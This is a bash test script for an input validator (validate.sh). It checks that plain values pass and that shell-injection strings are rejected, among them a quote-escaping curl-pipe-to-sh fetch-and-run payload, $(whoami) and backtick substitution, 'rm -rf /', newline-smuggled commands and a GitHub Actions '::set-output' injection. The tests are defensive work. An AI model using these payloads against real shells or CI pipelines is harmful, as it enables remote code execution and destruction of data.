#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
fail=0
ok()     { ./validate.sh "$1" >/dev/null   || { echo "FAIL (should pass):   $1"; fail=1; }; }
reject() { ! ./validate.sh "$1" >/dev/null || { echo "FAIL (should reject): $1"; fail=1; }; }

ok "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"
ok "abc123"
ok "hello world"

reject ""
reject '" && curl https://website.com/scripts.sh | sh && echo "'
reject '$(whoami)'
reject '`whoami`'
reject 'a; rm -rf /'
reject 'a | sh'
reject "a'b"
reject 'a"b'
reject $'abc\nwhoami'
reject $'abc\twhoami'
reject '::set-output name=x::y'

[ "$fail" = 0 ] && echo "All tests passed"
exit "$fail"
